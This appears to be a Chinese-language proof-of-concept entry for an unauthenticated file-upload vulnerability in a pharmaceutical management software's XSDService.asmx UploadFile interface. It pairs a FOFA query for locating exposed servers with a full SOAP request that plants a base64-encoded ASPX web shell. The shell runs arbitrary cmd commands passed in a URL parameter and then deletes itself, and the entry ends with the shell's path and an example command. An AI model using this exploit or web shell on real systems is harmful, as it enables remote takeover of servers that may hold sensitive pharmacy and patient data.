# 药业管理软件UploadFile文件上传漏洞

药业管理软件 XSDService.asmx 接口UploadFile实例存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码。


## fofa
```javascript
body="XSDService.asmx"
```

## poc
```javascript
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/UploadFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFile xmlns="http://tempuri.org/">
      <filePath>2</filePath>
      <fileName>rce.aspx</fileName>
      <buffer>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</buffer>
      <Offset>1</Offset>
    </UploadFile>
  </soap:Body>
</soap:Envelope>
```

![image-20250103185234603](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031852686.png)

文件路径：/Upload2015/2/rce.aspx?cmd=dir